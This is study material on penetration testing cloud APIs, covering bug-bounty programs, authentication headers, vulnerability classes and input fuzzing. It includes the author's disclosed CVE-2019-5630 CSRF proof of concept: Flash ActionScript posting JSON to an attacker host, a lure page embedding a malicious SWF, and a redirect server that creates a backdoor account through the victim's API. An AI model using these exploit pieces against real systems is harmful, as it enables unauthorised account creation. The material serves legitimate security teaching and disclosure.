# Pen-testing Cloud APIs: Study Material

##### Author Bio
- https://www.rodneybeede.com/curriculum%20vitae/bio.html

---

## Cloud Vendor Programs

- AWS
  - No public bug-bounty reward (VRP) program
- Google Cloud
  - _If a vulnerability is found, please report it via the Vulnerability Reward Program._
  - https://bughunters.google.com/
- Microsoft Azure
  - "enable responsible security testing" … "without causing harm"
  - https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement
  - https://www.microsoft.com/en-us/msrc/bounty
- Salesforce
  - "…invitation-only program…"
  - https://trailhead.salesforce.com/content/learn/modules/salesforce-bug-bounty-program/get-to-know-the-salesforce-bug-bounty-program
  - https://www.salesforce.com/company/legal/disclosure/
- OpenStack
  - Open source accessibility for testing
  - https://security.openstack.org/reporting.html

---

## What Uses Cloud APIs

- Command line tools
  - Some remote client to the API endpoint server
- Servers
  - Some web app calls other services' APIs
  - Example: Web app stores a file upload into Cloud Object Storage via an API call
- Web browsers
  - AJAX / JavaScript

---

## API Authentication (Common)

- Passed in an HTTP header
  - Authorization: Bearer some-token
  - Authorization: Basic cm9kbmV5OnRoYW5rc2ZvcmRlY29kaW5n
  - X-Auth-Token: some-token
  - Cookie: session-id=abcdef1234567890
  - Etc.
  
---

## API Vulnerability Example: CVE-2019-5630

- Endpoint for the API and the Web UI were shared
- API accepted call with Authorization or Cookie headers
- CSRF was possible
- https://www.rodneybeede.com/security/cve-2019-5630.html

# CVE-2019-5630

- Back when Flash was still in browsers
  - Site with malicious csrf.swf
- Send user a redirect to their own Nexpose InsightVM console API
- API endpoint "Content-Type: application/json"
  - Not typically allowed to set this via CSRF (web browser limitation)
  - Flash allowed this however
  - Lesson: **Don't assume** Content-Type is safe enough for CSRF prevention
- Web browser helpfully passed Cookie auth header
- REST API used authenticated session as user to create backdoor account

```javascript
      var url:String = "http://big-mean-attacker.rodneybeede.com:80/";
      var request:URLRequest = new URLRequest(url);
      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
      request.data = myJson;
      request.method = URLRequestMethod.POST;
```
https://github.com/rbeede/CVE-2019-5630/blob/master/csrf.as#L33

```html
<object width="500" height="500" data="http://big-mean-attacker.rodneybeede.com/csrf.swf"></object>
To see more cute cats "Click to enable Adobe Flash Player"
```

```python
class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_POST(s):
       # dir(s)
        if s.path == '/csrf.swf':
           s.send_response(200)
           s.send_header("Content-Type","application/x-shockwave-flash")
           s.end_headers()
           s.wfile.write(open("csrf.swf", "rb").read())
           return 
        elif s.path == '/pause':
           s.send_response(200)
           return
        s.send_response(307)
        s.send_header("Location", "https://rapid7.insightvm.example.com/api/3/users")
        s.end_headers()
```
https://github.com/rbeede/CVE-2019-5630/blob/master/hack-py-redirect-server.py

---

# API Types

- REST
  - HTTP headers play big role
  - HTTP request content payload
    - Popular to see json now
    - Sometimes plain HTTP form encoded data
- XML
  - Popular for SAML
  - Hint: Look for XXE attacks
- SOAP
  - Older, Not as popular today
  - Had WSDL (Web Service Definition Language)
- Some APIs support multiple
  - Example:  AWS S3 supports SOAP and REST

---

# Cloud Shared Responsibility Model

- Customer Responsibility
  - Configuration of customer account settings
  - Applying ACLs to data correctly
  - Customer provided software security
- Cloud Provider Responsibility
  - Infrastructure security
  - Web service (API, UI) code security
  - Data storage security (as specified by customer)
- We will be pen testing the cloud APIs themselves
  - Cloud Provider responsibility

---

# Cloud API Vulnerabilities

- Confused-deputy
  - Mishandled user input & authorization leads to customer data exposure
- Same account ACL (IDOR) bypass
  - Violating an IAM policy
- XSS
  - Reflective not very common (due to content-type) but not impossible
  - Persistent or DOM possible
- SSRF
  - Obtaining access to internal systems
- DoS
  - Causing API to exhaust provider resources
- HTTP 500 Errors
  - More useful than you think
- More: [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

# Discussion: API Input Fuzzing/Tampering

- Param is some type of number?
  - currpage = 1
- Try an unexpected number value
  - currpage = 4294967297
    - 2^32  +  1
  - currpage = -2147483649
    - 2^31 - 1
  - 2^64, 99999999999999999999999999999999999999999999, etc.
- Try no value
  - null, "", None, currpage=&nextparam…
- Did you get an unexpected (HTTP 500) error?

---

# Cloud Vendor Vulns

  - No exact number
    - Internally discovered vulns not published
  - Some public sources:
    - "Google Cloud: Here are the six 'best' vulnerabilities security researchers found last year" ([link](https://www.zdnet.com/article/google-cloud-here-are-the-six-best-vulnerabilities-security-researchers-found-last-year/) – zdnet.com; 2021)
    - Blogs ([https://github.com/hashishrajan/cloud-security-vulnerabilities](https://github.com/hashishrajan/cloud-security-vulnerabilities); 2023)
  - Azure – ~438 CVEs [(link - notcve.org)](https://notcve.org/search.php?query=Azure++vendor%3AMicrosoft)
  - Google Cloud – 206+ ([link](https://cloud.google.com/support/bulletins) – published by google.com)
  - AWS Security Bulletins – 51+ ([link](https://aws.amazon.com/security/security-bulletins/) – published by amazon.com)

These numbers do not mean one vendor is better than another. Just shows vulns do exist.

---

Next - [Authorization Vulnerabilities](auth-vulns.md)
